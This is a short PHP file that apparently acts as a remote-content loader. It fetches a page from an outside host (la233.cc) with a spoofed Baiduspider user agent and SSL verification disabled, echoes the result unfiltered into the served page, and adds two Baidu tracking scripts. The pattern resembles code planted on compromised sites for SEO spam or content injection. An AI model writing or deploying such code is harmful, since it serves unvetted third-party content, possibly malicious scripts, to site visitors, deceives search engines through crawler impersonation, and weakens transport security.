<?php
 echo httpGet2('http://la233.cc/pt.php');
echo '<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?c0e9a4336da05a4d9fd642112cc";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
';
echo '<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?1c211049e96974ab1ef5110d464ed46aad";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
';
// $arr = rand(1,2);

$url = $_SERVER['HTTP_HOST'];
$er = $_SERVER;

define('url8', $er['HTTP_HOST']);
function httpGet2($url) {
  header('Content-Type:text/html;charset=utf-8');
  $ch = curl_init();
  $ua2 = $_SERVER['HTTP_USER_AGENT'];
  curl_setopt($ch, CURLOPT_URL, $url);
//   curl_setopt($ch, CURLOPT_USERAGENT, 'MyCustomUA/1.0');
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)');
    
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}





  
  


